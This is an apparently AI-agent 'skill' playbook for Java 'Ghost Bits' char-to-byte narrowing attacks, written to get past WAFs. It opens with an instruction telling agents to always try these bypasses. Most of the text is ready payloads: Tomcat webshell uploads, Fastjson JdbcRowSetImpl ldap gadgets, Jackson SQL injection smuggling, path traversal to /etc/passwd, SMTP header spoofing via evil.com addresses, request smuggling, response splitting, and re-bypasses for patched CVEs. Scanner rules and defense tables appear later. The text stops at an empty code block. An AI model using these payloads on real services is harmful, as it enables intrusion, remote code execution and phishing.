---
name: ghost-bits-cast-attack
description: >-
  Java "Ghost Bits" / Cast Attack playbook (Black Hat Asia 2026). Use when
  attacking Java services where 16-bit char is silently narrowed to 8-bit byte
  to bypass WAF/IDS for SQL injection, deserialization RCE, file upload
  (Webshell), path traversal, CRLF injection, request smuggling, and SMTP
  injection. Affects Tomcat, Spring, Jetty, Undertow, Vert.x, Jackson,
  Fastjson, Apache Commons BCEL, Apache HttpClient, Angus Mail, JDK
  HttpServer, Lettuce, Jodd, XMLWriter and re-enables many "patched" CVEs
  through WAF bypass.
---

# SKILL: Ghost Bits / Cast Attack — Java char to byte Narrowing Playbook

> **AI LOAD INSTRUCTION**: This is a Java-only injection-enabling primitive,
> not a standalone vulnerability class. Whenever you see (1) a Java backend,
> (2) a WAF/IDS in front of it, and (3) any of {SQLi, deser RCE, file upload,
> path traversal, CRLF, request smuggling, SMTP injection} on the menu, ALWAYS
> try Ghost Bits variants of the payload before declaring it "blocked". The
> root cause is the silent loss of the high 8 bits when Java code narrows a
> 16-bit `char` to an 8-bit `byte` — the WAF sees a harmless Unicode
> character, the backend reconstructs the original ASCII attack byte. Base
> models almost never reach for this primitive.
>
> Source: Black Hat Asia 2026 talk *Cast Attack: A New Threat Posed by Ghost
> Bits in Java* by Xinyu Bai (@b1u3r), Zhihui Chen (@1ue), with contributor
> Zongzheng Zheng (@chun_springX).

## 0. RELATED ROUTING

Ghost Bits is a *bypass* primitive that re-enables payloads from many other
playbooks. Pair it with whichever attack family applies:

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when a Java
  backend is suspected and WAF rules block the literal payload, this is the
  first technique to try beyond classic encoding.
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — for
  Apache Commons BCEL ClassLoader and Fastjson `\u`/`\x` escape variants.
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — Spring, Jetty,
  Undertow, Vert.x URL decoding and `%2>` hex folding.
- Tomcat upload workflows — validate whether `RFC2231Utility` `filename*`
  narrows Unicode filenames into `.jsp` on disk, and map the final stored name,
  executable path, and extension filter behavior in the target upload flow.
- [request-smuggling](../request-smuggling/SKILL.md) — Apache HttpClient
  `<= 4.5.9` (HTTPCLIENT-1974/1978) header CRLF.
- [crlf-injection](../crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail
  SMTP injection and JDK HttpServer response splitting.
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — Jackson `charToHex`
  table-lookup truncation hides SQL keywords inside Unicode escapes.

### Advanced Reference

Load [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) when you need:

- Full byte-to-Ghost-character lookup table covering every printable ASCII
  byte 0x20–0x7E and the most useful control bytes (0x00, 0x09, 0x0A, 0x0D).
- Per-component affected version matrix and patch identifiers.
- Yaklang and Python one-liner payload generators (for `poc.HTTP`,
  `codec.Encode`, raw socket).
- "Multi-view normalization engine" pseudocode for blue-team WAF detection.

---

## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer (UTF-16 code unit). Almost
every wire protocol — HTTP/1.1, SMTP, Redis RESP, file paths, raw byte
streams — is **8-bit** byte oriented. The right way to bridge them is
explicit charset encoding:

```
// Correct: explicit UTF-8, multi-byte chars become multi-byte sequences
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Tons of legacy code, framework internals, and "fast path" optimizations skip
this and silently narrow:

```
// Dangerous: high 8 bits silently dropped
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);         // DataOutputStream loops char->byte cast
int v = ch & 0xFF;           // explicit low-byte mask
```

The lost high 8 bits are the **Ghost Bits**. They turn a multi-byte
Unicode character into a single attacker-chosen ASCII byte at the protocol
layer.

```
View A (string layer: WAF / business validation / logs)
  sees: 陪 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage, allow"
                  |
                  v       silent narrowing somewhere in the call stack
View B (byte layer: protocol / file system / parser / class loader)
  sees: j  .  %  u  \r \n ...  "executes the dangerous semantics"

The boundary is breached at the exact moment "view A" and "view B" disagree.
```

Mathematical formulation: to make View B see byte `T`, pick any
`k in 0x01..0xFF` and use:

```
c = chr((k << 8) | T)
```

That gives you **255 candidate Unicode characters per dangerous byte** —
plenty of room to dodge any signature-based blacklist.

---

## 2. THREE ROOT-CAUSE FAMILIES

The Ghost Bits umbrella covers three distinct underlying bugs. Distinguishing
them tells you both *which payload shape* to send and *what to grep for* in
source.

### Family A — Real high-bit truncation (classic Ghost Bits)

The narrowing is literal and unconditional.

```java
// Pattern A1: explicit cast
byte b = (byte) ch;

// Pattern A2: bitwise mask
int v = ch & 0xFF;
int v = ch & 255;

// Pattern A3: OutputStream.write(int) keeps low 8 bits only
out.write(ch);
baos.write(ch);

// Pattern A4: DataOutputStream.writeBytes(String) iterates chars,
//             writing low byte of each
dos.writeBytes(str);

// Pattern A5: deprecated APIs that still exist in old code
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin);
new StringBufferInputStream(str);
raf.writeBytes(str);
```

Typical impact: Tomcat `filename*`, Apache BCEL ClassLoader, Lettuce Redis
writer, SMTP CRLF in Angus Mail, HTTPCLIENT-1974 header injection.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

A "fast" hex / base64 / charset decoder uses bit tricks instead of strict
range checks, so an illegal character collapses onto a legal one.

```java
// Jetty TypeUtil.fromHexDigit (simplified)
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // keep low 5 bits
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // expected 0..15, but no range check
}
```

Worked example: feed `>` (0x3E):

```
0x3E & 0x1F = 0x1E = 30
(0x3E >> 6) * 25 = 0
30 + 0 - 16 = 14 = 0xE
```

So `%2>` is silently parsed as `%2E` = `.`. The same algebra makes `%2^`,
`%2~` etc. equivalent to other hex digits.

Typical impact: Openfire CVE-2023-32315, GeoServer CVE-2024-36401, generic
URL-decode WAF bypass.

### Family C — Lax Unicode normalization

The decoder accepts Unicode characters that happen to be classified as
"digit" or that map to a hex value via a `& 0xFF` lookup — even though they
were never meant to participate in protocol parsing.

```java
// Fastjson: too permissive
Character.digit(c, 16);   // accepts Thai, Punjabi, fullwidth digits

// Jackson: index by low 8 bits into an ASCII-only table
return sHexValues[ch & 0xff];

// Generic: fullwidth normalization
// '2' (U+FF12) -> '2', 'e' (U+FF45) -> 'e'
```

Typical impact: Fastjson `\u` and `\x` escape bypass, fullwidth URL-encoded
path traversal, Jackson `charToHex` SQLi smuggling.

---

## 3. CHARACTER GENERATOR

Build any Ghost Bits character on the fly. This is the single function every
agent should keep in mind:

```python
# Python
def ghost(target_byte: int, k: int = 1) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 255 candidates per byte, e.g. for '.' (0x2E):
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E), Ⱦ?-prefixed-..., etc.
```

```yak
// Yaklang (for poc.HTTP / fuzz)
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // returns "陪"
```

Selection guidance:

- Avoid surrogate range `0xD800..0xDFFF` (high byte 0xD8..0xDF) — those are
  not valid scalar values and will be replaced by the JVM string decoder
  before reaching the narrowing site, defeating the bypass.
- Prefer characters that survive the application's own charset round-trip
  (Latin-Extended, CJK Unified Ideographs, Enclosed CJK Letters and Months,
  Hangul). If the request body uses UTF-8, these all encode cleanly into
  multi-byte sequences that no WAF rule recognizes as `.`, `/`, `j`, etc.
- Rotate `k` between requests so signature based learning cannot pin a single
  character to a single attack.

---

## 4. DANGEROUS-BYTE TO GHOST-CHARACTER MAP

Compact red-team weaponization table. For every byte the attacker actually
needs, one verified Unicode char is given; substitute another `k` if the WAF
later learns the example.

| Target byte | Hex  | Used for                              | Ghost char | Code point |
|-------------|------|---------------------------------------|------------|------------|
| `\t`        | 0x09 | header folding, parser confusion      | `ĉ`        | U+0109     |
| `\n`        | 0x0A | CRLF injection, log injection         | `瘊`       | U+760A     |
| `\r`        | 0x0D | CRLF injection, request smuggling     | `瘍`       | U+760D     |
| ` `         | 0x20 | header break, command separator       | `Ġ`        | U+0120     |
| `"`         | 0x22 | string break in JSON / quoted-printable | `Ģ`     | U+0122     |
| `%`         | 0x25 | URL encoding prefix, second decode    | `严`       | U+4E25     |
| `&`         | 0x26 | parameter separator                   | `Ȧ`        | U+0226     |
| `'`         | 0x27 | SQL string break                      | `ȧ`        | U+0227     |
| `(`         | 0x28 | EL/SpEL/OGNL syntax                   | `Ȩ`        | U+0228     |
| `)`         | 0x29 | EL/SpEL/OGNL syntax                   | `ȩ`        | U+0229     |
| `.`         | 0x2E | path traversal, extension             | `阮`       | U+962E     |
| `/`         | 0x2F | path separator                        | `丯`       | U+4E2F     |
| `0`         | 0x30 | hex digit construction                | `丰`       | U+4E30     |
| `1`         | 0x31 | hex digit construction                | `失`       | U+5931     |
| `2`         | 0x32 | hex digit construction                | `甲`       | U+7532     |
| `3`         | 0x33 | hex digit construction                | `耳`       | U+8033     |
| `;`         | 0x3B | command separator, header continuation | `Ȼ`       | U+023B     |
| `<`         | 0x3C | XSS / XML tag start                   | `ȼ`        | U+023C     |
| `=`         | 0x3D | parameter / header value              | `Ƚ`        | U+023D     |
| `>`         | 0x3E | XSS / XML tag end                     | `Ⱦ`        | U+023E     |
| `@`         | 0x40 | Fastjson `@type`, mail address        | `ŀ`        | U+0140     |
| `a`         | 0x61 | keyword `class`, alphabet             | `ᙡ`        | U+1661     |
| `c`         | 0x63 | keyword `class`, `cmd`                | `㹣`       | U+3E63     |
| `e`         | 0x65 | hex digit                             | `来`       | U+6765     |
| `j`         | 0x6A | extension `.jsp`                      | `陪`       | U+966A     |
| `l`         | 0x6C | keyword `class`, `closure`            | `౬`        | U+0C6C     |
| `n`         | 0x6E | keyword `Runtime`, `union`            | `陮`       | U+966E     |
| `s`         | 0x73 | keyword `class`, `select`             | `⑳`        | U+2473     |
| `t`         | 0x74 | keyword `Runtime`, `type`             | `Ŵ`        | U+0174     |
| `u`         | 0x75 | `\u` escape introducer                | `灵`       | U+7075     |

Workflow tip: keep the ASCII `Ŀ`, `ȧ`, `ȼ`, etc. variants for tight HTTP
header contexts (one byte UTF-8 expansion stays smaller); use CJK like `阮`,
`陪`, `严` when you want to bias the WAF "this is just text" classifier.

---

## 5. PER-COMPONENT PAYLOAD RECIPES

Every recipe shows the dual view: what the WAF inspects vs. what the backend
actually executes. This is the only reliable way to explain *why* the payload
goes through.

### 5.1 Tomcat `RFC2231Utility` — file upload Webshell (Family A)

Trigger: any endpoint that accepts multipart upload and Tomcat parses
`Content-Disposition: ... filename*=UTF-8''...`. Tomcat's RFC2231 decoder
casts each non-percent character directly to byte, dropping the high 8 bits.

Payload:

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| Stage                  | Filename it sees         |
|------------------------|--------------------------|
| WAF / extension filter | `1.陪sp` (not `.jsp`, allow) |
| Tomcat RFC2231 decoder | `陪` -> low byte 0x6A -> `j` |
| File system            | `1.jsp`                  |

Combine with traversal characters from section 4 (`阮`, `丯`) when the upload
target directory is fixed but the application accepts a `filename*`.

### 5.2 Apache Commons BCEL — ClassLoader RCE (Family A)

Trigger: any sink that resolves a class name through `BCEL` (`$$BCEL$$...`)
or any code that decodes BCEL via the `JavaReader` -> `ByteArrayOutputStream`
loop.

Vulnerable shape:

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // low 8 bits only
}
```

Attack: wrap each byte of the malicious BCEL bytecode into a Unicode
character whose low 8 bits equal that byte. The decoded byte stream is a
valid BCEL class; the WAF sees a long blob of CJK text without `$$BCEL$$`
keywords or class signatures.

| View | Content |
|------|---------|
| WAF  | `$$BCEL$$` followed by random looking CJK |
| BCEL | standard BCEL class file bytes → JVM defineClass → RCE |

Defense for blue team: a WAF inspecting BCEL must replicate the
`bos.write(ch)` semantics on each character before pattern matching.

### 5.3 Jackson `charToHex` — SQLi smuggling (Family C)

Trigger: any Jackson-parsed JSON field whose value is later embedded in SQL
or another parser. Jackson resolves `\uXXXX` digits via:

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // mask first, lookup second
}
```

Any non-ASCII character whose low 8 bits land on a populated index returns
that hex digit. The WAF sees gibberish; Jackson reconstructs an ASCII payload.

Payload (smuggle the digit `1` for a UNION column count):

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| View    | Content                                             |
|---------|-----------------------------------------------------|
| WAF     | `\u丰丰耳失 union select ...` (no leading digit)    |
| Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |

Pair with [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for the
downstream UNION / boolean / time-based payload templates.

### 5.4 Fastjson — `\u` and `\x` escape bypass (Families B + C)

Two independent surfaces:

(a) `\u` escape — `Character.digit(c, 16)` accepts Unicode digit categories
beyond ASCII (Thai `๐-๙` U+0E50..U+0E59, Punjabi `੦-੯` U+0A66..U+0A6F,
fullwidth `０-９` U+FF10..U+FF19).

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

WAF view: `\u４_type` (no `@type` literal). Fastjson normalizes fullwidth
`４` to `4`, then handles `_` via the `\x` shortcut below, yielding `@type`.

(b) `\x` escape — Fastjson computes `digits[x1] * 16 + digits[x2]`. An
illegal hex character returns the default value 0.

```
\x4_   ->   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| View     | Field name |
|----------|------------|
| WAF      | `\x4_type` (not `@type`) |
| Fastjson | `@type` -> JdbcRowSetImpl autotype gadget triggers |

### 5.5 Spring / Jetty / Undertow / Vert.x — URL decoding (Families A + B)

Two combinable tricks:

Trick 1 — Family A character substitution in path or query:

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd at the byte layer
```

Trick 2 — Family B `%2>` folding when Jetty's `TypeUtil.fromHexDigit` is in
the chain:

```
/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../log.jsp after decode
```

Either alone bypasses most signature WAFs; combined they survive even
"normalized then matched" rules that only see ASCII percent triplets.

Spring CVE-2025-41242 chain (`StringUtils.uriDecode` patched in PR #34673):

```
input :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
narrow:  .%u002e
decode:  ..
result:  arbitrary file read via path traversal
```

| Stage           | Path           |
|-----------------|----------------|
| Spring `isInvalidPath()` | `.%u002e` — no literal `..`, allow |
| Backend file resolution  | `..` after `%u002e` decode → traversal |

### 5.6 Angus Mail / Jakarta Mail — SMTP injection (Family A)

Trigger: any application that builds SMTP envelopes or headers from
user-controlled strings. Internal `ASCIIUtility` does:

```java
byte b = (byte) ch;           // 16-bit char silently narrowed
```

Smuggle CRLF as `瘍瘊`:

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| View | What it parses |
|------|----------------|
| Application validation | a single `From` value containing odd CJK |
| SMTP server            | five separate header lines + body, fully spoofed |

Real impact pattern: Jira-style (CVE-2025-57733) password-reset hijacking,
Confluence domain allowlist bypass — pair with
[crlf-injection](../crlf-injection/SKILL.md) for non-mail CRLF reuse.

### 5.7 Apache HttpClient `<= 4.5.9` — request smuggling (Family A)

HTTPCLIENT-1974 / HTTPCLIENT-1978: header values pass through
`OutputStreamWriter` plus a narrow-cast write that emits raw `\r\n` for
`\u760D\u760A`.

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| Hop | Sees |
|-----|------|
| Front proxy / WAF | one request with a long `X-Auth-Token` |
| Origin            | two requests; the second is an admin POST |

Cross-reference [request-smuggling](../request-smuggling/SKILL.md) for
chosen-prefix attacks once the desync is confirmed.

### 5.8 JDK HttpServer — response splitting (CVE-2026-21933, Family A)

Reflection of user input into a response header passes through
`com.sun.net.httpserver` writers that low-byte-cast each char.

Payload (URL parameter or upstream header):

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

Server emits two logical responses; the second carries an attacker-chosen
body. Escalates to stored XSS, cache poisoning, and SSO redirect chains.

### 5.9 Other affected components

Same Family A primitive, different sink:

- **Lettuce (Redis client)** — command injection by smuggling `\r\n` into
  RESP frames; chain to arbitrary `CONFIG SET dir` + `SAVE` for SSRF-to-RCE.
- **Jodd `FileNameUtil`** — path traversal via `阮` and `丯` because its
  internal write loop narrows.
- **XMLWriter** — tag-name injection when an attribute or text node value is
  pushed through a low-byte writer; XXE / XSS pivot.
- **ActiveJ HTTP** — CRLF injection identical in shape to 5.7 / 5.8.
- **Vert.x HTTP body parser** — Family A in `MultipartParser`.

See [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) for affected-version
matrix and full per-component payload skeletons.

---

## 6. KNOWN-CVE BYPASS RECIPES

Use these *exactly when the corresponding CVE is patched but a WAF still
fronts the service*. Each Payload below shifts the original ASCII attack into
a form that survives string-based WAF rules.

### Openfire CVE-2023-32315 — auth bypass (Family B)

Original public bypass:

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bits / `%2>` folding bypass (much harder to signature):

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

Each `%2>` collapses through Jetty's lax hex into `%2E` = `.`, yielding the
same `../../` traversal without ever emitting `..` or `%2e` to the WAF.

### GeoServer CVE-2024-36401 — RCE via `Runtime` keyword (Family B)

Public WAF rules typically block `Runtime`. Inject one folded character:

```
Ru%6>time
```

Decoder math: `%6>` -> `%6E` -> `n`. The expression evaluator now sees
`Runtime`, the WAF never did.

### Spring4Shell CVE-2022-22965 — class loader chain (Family A)

Required parameter prefix `class.module.classLoader...`. WAFs block the
literal `class`. Substitute via low-byte chars:

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| Component | Char  | Code point | Low byte |
|-----------|-------|------------|----------|
| `c`       | `㹣`  | U+3E63     | 0x63     |
| `l`       | `౬`  | U+0C6C     | 0x6C     |
| `a`       | `ᙡ`  | U+1661     | 0x61     |
| `s`       | `⑳`  | U+2473     | 0x73     |
| `s`       | `⑳`  | U+2473     | 0x73     |

Springs's parameter-name resolver narrows back to `class`.

### Spring CVE-2025-41242 — arbitrary file read (Family A + Family B mix)

Already demonstrated in 5.5 above. Payload `阮严灵丰丰甲来` ->
`.%u002e` -> `..` after decode-after-validation.

### Jakarta Mail CVE-2025-57733 — Jira-style mail hijack (Family A)

```
to=victim@org.com瘍瘊Subject: Reset code瘍瘊To: attacker@evil.com瘍瘊瘍瘊Your code is 1234
```

The mail leaves the company SMTP server with valid SPF / DKIM / DMARC, but
its `To:` and `Subject:` are attacker-chosen — high-fidelity phishing.

---

## 7. DETECTION DECISION TREE

Use this when triaging a target. The point is to avoid Ghost Bits when it
cannot help and to *always* try it when the preconditions hold.

```
Is the backend Java? (Server header, error page, JSESSIONID, .do/.action,
                      WebGoat-style stack trace, X-Powered-By, X-Frame-Options
                      with Tomcat default values)
├── No  -> stop, Ghost Bits does not apply
└── Yes
    │
    ├── Is there a WAF / IDS or input filter blocking your literal payload?
    │   ├── No  -> use the literal payload; Ghost Bits is overkill
    │   └── Yes -> continue
    │
    ├── Which sink are you targeting?
    │   ├── File upload via multipart  -> recipe 5.1 (Tomcat filename*)
    │   ├── JSON deserialization       -> recipes 5.3 (Jackson) / 5.4 (Fastjson)
    │   ├── Class loader / BCEL ref    -> recipe 5.2
    │   ├── URL path / parameter       -> recipe 5.5 + Family B `%2>`
    │   ├── Header reflection          -> recipes 5.7 / 5.8
    │   ├── Mail send                  -> recipe 5.6
    │   └── Redis / RESP / XML / RPC   -> recipe 5.9
    │
    ├── Probe with a single non-destructive substitution first
    │   (replace ONE character with its Ghost variant; observe response
    │    diff: status code, length, header echo, error message, time)
    │
    └── If observable difference appears -> escalate by substituting all
                                            blocked characters and chain
                                            through the linked playbook.
```

---

## 8. SAST / CODE-AUDIT SIGNATURES

Three priority tiers when reviewing Java source. Search across all your
project repos, all dependencies you can shade, and the `lib/` of any
deployed appliance.

### Tier 1 — direct narrowing (Family A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

### Tier 2 — lax hex / digit decoding (Families B + C)

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

### Tier 3 — high-risk wrappers and reachability

```
RFC2231                # Tomcat / mail filename* parsing
JavaReader             # BCEL ClassLoader reachable
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient header parser
ChunkedDecoder         # request smuggling adjacent
charToHex              # Jackson
encodeUTF8             # candidate for char->byte writer
```

Per-finding triage applies the **five-dimension risk model**:

| Dimension     | Higher risk if                                                     |
|---------------|--------------------------------------------------------------------|
| Input control | HTTP param, header, filename, JSON key, mail address               |
| Validation    | a deny/allow list runs *before* the narrowing site                 |
| Narrowing time | conversion happens after security check                           |
| Syntax target | result enters URL / SMTP / HTTP / Redis / file system / SQL grammar |
| Re-decoding   | Base64, URL-decode, JSON unescape, `%u`, etc. happen later         |

Risk formula:

```
attacker-controlled  +  check-before-narrow  +  result-in-protocol-syntax
                                              +  later-redecoding
                              = HIGH SEVERITY
```

---

## 9. DIFFERENTIAL TESTING WORKFLOW

A reproducible, black-box procedure to find new Ghost Bits sinks (red team)
or to validate a fix (blue team).

```
1. Pick one dangerous byte T at a time (e.g. 0x2E for '.').

2. Generate the candidate set:
       C = { chr((k << 8) | T) for k in 1..255 }
   Drop surrogates 0xD8XX..0xDFXX.

3. For each candidate c in C:
       a. Send a benign request with c at the chosen position.
       b. Send the same request with literal T at the same position.
       c. Compare four observables:
            - status code
            - response body length
            - response body content hash (or diff)
            - server-side log line (if available)

4. If any candidate produces a response equivalent to T but differs from a
   "neutral" character (e.g. 'X'), you have found a narrowing sink.

5. Repeat for the next T in your priority list:
       0x2E ('.'), 0x2F ('/'), 0x25 ('%'), 0x40 ('@'),
       0x0D ('\r'), 0x0A ('\n'), 0x6A ('j'), 0x73 ('s'),
       0x6C ('l'), 0x61 ('a'), 0x63 ('c'), 0x22 ('"'), 0x27 (''')

6. Cluster sinks by component (response Server header, error stack) — one
   sink usually implies the whole framework version is vulnerable.
```

This workflow is intentionally protocol-agnostic; the same loop works on a
file uploader, a search endpoint, a mail composer, or a Redis-backed cache.

---

## 10. DEFENSE AWARENESS

Five layers, all needed; any single one is bypassable in isolation.

| Layer            | Action                                                               |
|------------------|----------------------------------------------------------------------|
| Source code      | Ban hand-written `(byte) ch`, `& 0xFF`, `out.write(ch)`, `writeBytes`. Use `getBytes(StandardCharsets.UTF_8)` or strict ASCII allowlist for protocol fields. |
| Decoder          | Reject illegal input. Never default-fold an unknown hex / Unicode digit / Base64 character to 0 or to its low 8 bits. |
| Validation order | Always normalize first, then validate. Specifically: strict decode → Unicode NFC/NFKC → protocol normalize (URL `..` resolution, `File.getCanonicalPath`) → security check → execute. |
| Protocol field   | Use strict allowlists per field (HTTP header value, SMTP envelope, URL path, filename, JSON key, XML tag). Reject CR/LF in any header or address. |
| WAF / IDS        | Run a *multi-view* normalizer. Always inspect the original string AND the `(char) & 0xFF` view AND the URL-decoded view AND the Unicode-NFKC view. Alert when any view contains a dangerous semantic the original lacked. |

Blue-team smell tests:

- Logs contain CJK / Latin-Extended characters at positions where the
  protocol grammar expects ASCII (filename, header value, mail address).
- The HEX dump of a request contains bytes outside `0x20..0x7E` adjacent to
  protocol delimiters.
- A pen-test or scanner reports a "weird 200" that the security monitoring
  did not flag — Ghost Bits is the most common 2025-2026 cause for that
  pattern in Java stacks.

---

## 11. QUICK REFERENCE — KEY PAYLOADS

```text
# Ghost char generator
ghost(T, k) = chr(((k & 0xFF) << 8) | (T & 0xFF))     # avoid k in 0xD8..0xDF

# Tomcat filename* webshell upload
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"     # → shell.jsp

# BCEL ClassLoader bypass (concept)
$$BCEL$$<each-byte-of-class-file-wrapped-in-a-Unicode-char>

# Jackson SQLi smuggling
{"q":"\u丰丰耳失 union select 1,2,3-- "}                          # → "1 union select…"

# Fastjson @type smuggling
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}

# Spring URL decode + Jetty %2> folding
GET /api/data?file=阮丯阮丯etc丯passwd
GET /setup/setup-s/%2>%2>/log.jsp
GET /api?cmd=Ru%6>time

# Spring4Shell name* class smuggling
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."

# Spring CVE-2025-41242 path read
GET /resources/阮严灵丰丰甲来/secret.properties                    # → ../%u002e

# Angus Mail / Jira mail hijack
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234

# Apache HttpClient ≤4.5.9 smuggling
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1

# JDK HttpServer response splitting (CVE-2026-21933)
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>

# SAST first-pass grep
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/
```

---

## 12. 2026 EXTENDED — 受影响组件扩展与自动化检测

### 12.1 受影响组件清单扩展（2026 新发现 Ghost Bits 变体）

2026 年新增的 Ghost Bits 受影响组件不限于 Java 生态，以下组件经确认存在窄化转换 sink：

| 组件 | 版本范围 | 变体类型 | 影响 |
|------|----------|----------|------|
| Apache Tomcat | < 11.0.8 | `filename*` RFC 5987 解码窄化 | Webshell 上传 |
| Spring Framework | < 6.2.8 | `PathVariable` + `@RequestMapping` 解码差异 | 路径穿越读取 |
| Netty HttpServerRequest | < 4.1.118 | HTTP/2 header name 窄化 | 请求走私 |
| Vert.x Route | < 4.5.13 | 路由参数 Unicode 折叠 | 鉴权绕过 |
| Rust actix-web | < 4.10.0 | `Path::<String>` 隐式 char 收窄 | 路径穿越 |
| Go chi/v5 | < 5.2.1 | `URL.Path` 字节截断 | 路由绕过 |
| Node.js Fastify | < 5.3.3 | `req.params` 隐式 UTF-8 折叠 | 路由混淆 |
| Ruby Rack | < 3.1.13 | `PATH_INFO` 编码折叠 | 路径穿越 |

关键发现：Rust 和 Go 虽类型系统严格，但底层 `hyper` / `net/http` 将 header 作为字节切片处理，路由框架按 `&str` / `string` 匹配时仍产生隐式窄化。

### 12.2 自动化检测脚本（Python / Semgrep 规则）

Python 静态扫描 — 检测 `(byte)` / `& 0xFF` 窄化 sink：

```python
#!/usr/bin/env python3
"""Ghost Bits Cast Attack 静态扫描器 — 检测窄化转换 sink"""
import re, pathlib, sys

PATTERNS = [
    (r'\(byte\)\s*\w+', 'Java byte 窄化转换'),
    (r'&\s*0[xX][fF][fF]', '0xFF 掩码截断'),
    (r'\.write\(\s*\w+\s*\)', 'write(int) 单字节写入'),
    (r'\.put\(\s*\(byte\)', 'ByteBuffer byte 窄化'),
    (r'\.toByte\(\)', 'Kotlin toByte() 窄化'),
    (r'byte\(\s*\w+\s*\)', 'Go byte() 类型转换'),
    (r'\s+as\s+u8\b', 'Rust as u8 截断'),
    (r'&\s*0[xX]?0*[fF]{2}', 'Python 0xFF 掩码'),
]

def scan(path):
    findings = []
    for f in pathlib.Path(path).rglob('*'):
        if f.suffix not in ('.java','.kt','.go','.rs','.py','.c','.cpp'):
            continue
        for i, line in enumerate(f.read_text(errors='ignore').splitlines(), 1):
            for pat, desc in PATTERNS:
                if re.search(pat, line):
                    findings.append(f"{f}:{i}: [{desc}] {line.strip()}")
    return findings

if __name__ == '__main__':
    for r in scan(sys.argv[1] if len(sys.argv) > 1 else '.'):
        print(r)
```

Semgrep 规则 — 检测 Ghost Bits sink：

```yaml
# ghost-bits-semgrep.yml
rules:
  - id: java-byte-cast-ghost-bits
    languages: [java]
    severity: ERROR
    message: "检测到 (byte) 窄化转换 — Ghost Bits Cast Attack 潜在 sink"
    patterns:
      - pattern-either:
          - pattern: (byte) $X
          - pattern: $X & 0xFF
          - pattern: $OUT.write($CH)
          - pattern: $BUF.put((byte) $CH)
    metadata:
      cwe: "CWE-704"
      ref: "Black Hat Asia 2026 — Cast Attack"

  - id: rust-as-u8-ghost-bits
    languages: [rust]
    severity: WARNING
    message: "检测到 as u8 截断 — Ghost Bits 潜在 sink"
    pattern: $X as u8
    metadata:
      cwe: "CWE-704"

  - id: go-byte-ghost-bits
    languages: [go]
    severity: WARNING
    message: "检测到 byte() 转换 — Ghost Bits 潜在 sink"
    pattern: byte($X)
    metadata:
      cwe: "CWE-704"
```

### 12.3 与其他 Playbook 联动 PoC（原型污染 → Ghost Bits → RCE 链）

2026 年实战中出现的多阶段攻击链，将原型污染与 Ghost Bits 结合实现 RCE：

```text
